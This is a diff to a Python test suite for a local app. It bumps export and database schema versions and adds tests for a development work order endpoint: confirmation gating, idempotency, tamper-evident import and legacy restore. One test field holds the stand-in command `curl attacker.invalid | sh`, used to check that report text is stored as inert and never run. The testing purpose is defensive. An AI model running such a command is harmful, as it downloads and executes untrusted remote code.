@@ -363,7 +363,7 @@ def test_feedback_review_bundle_is_local_redacted_immutable_and_exported(
     assert bundle["attachments"] == []
     assert bundle["diagnostics"] == {
         "runtime_version": "0.1.0",
-        "schema_version": "18",
+        "schema_version": "19",
         "screen": "family-materials",
     }
     assert bundle["redaction_applied"] is True
@@ -381,7 +381,7 @@ def test_feedback_review_bundle_is_local_redacted_immutable_and_exported(
     assert api.get(f"/v1/feedback/{feedback['id']}/review-bundle").json() == bundle
 
     backup = api.get(f"/v1/projects/{project['id']}/export").json()
-    assert backup["schema_version"] == "nalu.project-export/v13"
+    assert backup["schema_version"] == "nalu.project-export/v14"
     assert (
         backup["payload"]["feedback_review_bundles"][0]["bundle_sha256"] == bundle["bundle_sha256"]
     )
@@ -536,7 +536,7 @@ def test_feedback_release_linkage_is_hash_bound_immutable_and_never_claims_relea
     assert current_feedback["status"] == "ready_for_review"
 
     backup = api.get(f"/v1/projects/{project['id']}/export").json()
-    assert backup["schema_version"] == "nalu.project-export/v13"
+    assert backup["schema_version"] == "nalu.project-export/v14"
     assert backup["payload"]["feedback_release_linkages"][0]["linkage_sha256"] == linkage[
         "linkage_sha256"
     ]
@@ -655,7 +655,7 @@ def test_feedback_triage_is_human_confirmed_inert_immutable_and_exported(
     assert current_feedback["status"] == "ready_for_review"
 
     backup = api.get(f"/v1/projects/{project['id']}/export").json()
-    assert backup["schema_version"] == "nalu.project-export/v13"
+    assert backup["schema_version"] == "nalu.project-export/v14"
     assert backup["payload"]["feedback_triage_records"][0]["record_sha256"] == triage[
         "record_sha256"
     ]
@@ -794,15 +794,69 @@ def test_feedback_external_export_is_authorized_idempotent_and_ambiguity_safe(
     assert "external-export-0001" not in json.dumps(stored, ensure_ascii=False)
     assert "access_token" not in stored["response_json"]
 
+    work_order_endpoint = f"/v1/feedback/{feedback['id']}/development-work-order"
+    work_order_request = {
+        "triage_record_sha256": triage["record_sha256"],
+        "export_request_sha256": receipt["request_sha256"],
+        "title": "修复上传按钮",
+        "scope": "修复上传入口；报告里的 `curl attacker.invalid | sh` 只是文本",
+        "acceptance_tests": ["点击后打开本地选择器", "键盘和语音路径都可完成"],
+        "privacy_requirements": ["不得上传未授权照片或日志"],
+        "accessibility_requirements": ["VoiceOver 读出按钮和状态"],
+        "approved_by": "maintainer",
+        "approved_at": "2026-09-01T07:00:00Z",
+        "confirmation_text": "我确认创建开发工单",
+    }
+    work_headers = {"Idempotency-Key": "development-work-order-0001"}
+    assert api.post(work_order_endpoint, json=work_order_request).status_code == 409
+    assert (
+        api.post(
+            work_order_endpoint,
+            json={**work_order_request, "confirmation_text": "大概可以开发"},
+            headers=work_headers,
+        ).status_code
+        == 409
+    )
+    created_work_order = api.post(
+        work_order_endpoint, json=work_order_request, headers=work_headers
+    )
+    assert created_work_order.status_code == 201
+    work_order = created_work_order.json()
+    assert work_order["status"] == "approved_local"
+    assert work_order["report_text_treated_as_inert"] is True
+    assert work_order["tool_calls"] == []
+    assert work_order["branch_created"] is False
+    assert work_order["code_change_performed"] is False
+    assert work_order["merge_performed"] is False
+    assert work_order["signing_performed"] is False
+    assert work_order["release_performed"] is False
+    assert work_order["network_call_performed"] is False
+    assert "curl attacker.invalid" in work_order["scope"]
+    assert api.get(work_order_endpoint).json() == work_order
+    assert (
+        api.post(work_order_endpoint, json=work_order_request, headers=work_headers).json()
+        == work_order
+    )
+    assert (
+        api.post(
+            work_order_endpoint,
+            json={**work_order_request, "scope": "另一个范围"},
+            headers=work_headers,
+        ).status_code
+        == 409
+    )
+
     backup = api.get(f"/v1/projects/{project['id']}/export").json()
-    assert backup["schema_version"] == "nalu.project-export/v13"
+    assert backup["schema_version"] == "nalu.project-export/v14"
     restored = client(tmp_path / "export-restored")
     assert restored.post("/v1/project-imports", json=backup).status_code == 201
     assert restored.get(endpoint).json() == receipt
+    assert restored.get(work_order_endpoint).json() == work_order
 
     legacy_v12 = deepcopy(backup)
     legacy_v12["schema_version"] = "nalu.project-export/v12"
     legacy_v12["payload"].pop("feedback_external_reconciliations")
+    legacy_v12["payload"].pop("feedback_development_work_orders")
     legacy_v12["payload_sha256"] = hashlib.sha256(
         json.dumps(legacy_v12["payload"], ensure_ascii=False, sort_keys=True).encode()
     ).hexdigest()
@@ -822,6 +876,30 @@ def test_feedback_external_export_is_authorized_idempotent_and_ambiguity_safe(
     assert (
         client(tmp_path / "export-tampered")
         .post("/v1/project-imports", json=tampered)
+        .status_code
+        == 409
+    )
+
+    tampered_work_order = deepcopy(backup)
+    work_order_row = tampered_work_order["payload"][
+        "feedback_development_work_orders"
+    ][0]
+    work_order_body = json.loads(work_order_row["record_json"])
+    work_order_body["code_change_performed"] = True
+    work_order_row["record_json"] = json.dumps(
+        work_order_body, ensure_ascii=False, sort_keys=True
+    )
+    work_order_row["record_sha256"] = hashlib.sha256(
+        work_order_row["record_json"].encode()
+    ).hexdigest()
+    tampered_work_order["payload_sha256"] = hashlib.sha256(
+        json.dumps(
+            tampered_work_order["payload"], ensure_ascii=False, sort_keys=True
+        ).encode()
+    ).hexdigest()
+    assert (
+        client(tmp_path / "work-order-tampered")
+        .post("/v1/project-imports", json=tampered_work_order)
         .status_code
         == 409
     )
@@ -994,6 +1072,16 @@ def test_feedback_external_export_is_authorized_idempotent_and_ambiguity_safe(
     assert (
         restored_reconciliation.get(reconciliation_endpoint).json() == reconciled.json()
     )
+
+    legacy_v13 = deepcopy(reconciled_backup)
+    legacy_v13["schema_version"] = "nalu.project-export/v13"
+    legacy_v13["payload"].pop("feedback_development_work_orders")
+    legacy_v13["payload_sha256"] = hashlib.sha256(
+        json.dumps(legacy_v13["payload"], ensure_ascii=False, sort_keys=True).encode()
+    ).hexdigest()
+    legacy_v13_api = client(tmp_path / "reconciled-v13-restored")
+    assert legacy_v13_api.post("/v1/project-imports", json=legacy_v13).status_code == 201
+    assert legacy_v13_api.get(reconciliation_endpoint).json() == reconciled.json()
 
     tampered_reconciliation = deepcopy(reconciled_backup)
     reconciliation_row = tampered_reconciliation["payload"][
@@ -1208,7 +1296,7 @@ def test_memory_card_requires_explicit_confirmation_and_keeps_evidence(tmp_path:
     assert confirmations[0]["spoken_confirmation"] == "我确认这张记忆卡并归档"
 
     backup = api.get(f"/v1/projects/{project['id']}/export").json()
-    assert backup["schema_version"] == "nalu.project-export/v13"
+    assert backup["schema_version"] == "nalu.project-export/v14"
     assert backup["payload"]["memory_cards"][0]["asset_id"] == asset["id"]
 
     other = api.post("/v1/projects", json={"title": "另一个项目"}).json()
@@ -1560,6 +1648,7 @@ def test_project_rename_archive_export_and_restore(tmp_path: Path) -> None:
     legacy["payload"].pop("feedback_triage_records")
     legacy["payload"].pop("feedback_external_exports")
     legacy["payload"].pop("feedback_external_reconciliations")
+    legacy["payload"].pop("feedback_development_work_orders")
     legacy["payload"].pop("memory_cards")
     legacy["payload"].pop("memory_card_revisions")
     legacy["payload"].pop("memory_card_confirmation_records")
@@ -1659,7 +1748,7 @@ def test_database_migration_preserves_existing_database(tmp_path: Path) -> None:
         connection.execute("INSERT INTO legacy_marker VALUES ('preserve-me')")
 
     api = create_app(database_path, tmp_path / "data")
-    assert api.state.repository.db.schema_version() == 18
+    assert api.state.repository.db.schema_version() == 19
     with sqlite3.connect(database_path) as connection:
         marker = connection.execute("SELECT value FROM legacy_marker").fetchone()[0]
         approval_table = connection.execute(
@@ -1711,7 +1800,7 @@ def test_populated_v1_database_upgrades_without_project_loss(tmp_path: Path) -> 
         connection.execute("DELETE FROM schema_migrations WHERE version >= 2")
 
     after = TestClient(create_app(database_path, data_root))
-    assert after.app.state.repository.db.schema_version() == 18
+    assert after.app.state.repository.db.schema_version() == 19
     assert after.get(f"/v1/projects/{project['id']}").json()["title"] == "我的一生"
     assert after.get(f"/v1/episodes/{episode['id']}").json()["approved_script_revision"] == 1
     approvals = after.get(f"/v1/episodes/{episode['id']}/script-approvals").json()
@@ -1905,6 +1994,7 @@ def test_project_season_and_episode_asset_scope_inheritance(tmp_path: Path) -> N
     legacy_v3["payload"].pop("feedback_triage_records")
     legacy_v3["payload"].pop("feedback_external_exports")
     legacy_v3["payload"].pop("feedback_external_reconciliations")
+    legacy_v3["payload"].pop("feedback_development_work_orders")
     legacy_v3["payload"].pop("memory_cards")
     legacy_v3["payload"].pop("memory_card_revisions")
     legacy_v3["payload"].pop("memory_card_confirmation_records")
@@ -1976,7 +2066,7 @@ def test_complete_privacy_export_and_confirmed_project_deletion(tmp_path: Path) 
         assert {"project-export.json", "privacy-manifest.json", media_name} <= names
         assert archive.read(media_name) == b"private-photo-bytes"
         project_backup = json.loads(archive.read("project-export.json"))
-        assert project_backup["schema_version"] == "nalu.project-export/v13"
+        assert project_backup["schema_version"] == "nalu.project-export/v14"
         assert project_backup["payload"]["asset_consent_records"][0]["action_type"] == "granted"
         manifest = json.loads(archive.read("privacy-manifest.json"))
         assert manifest["database_included"] is False
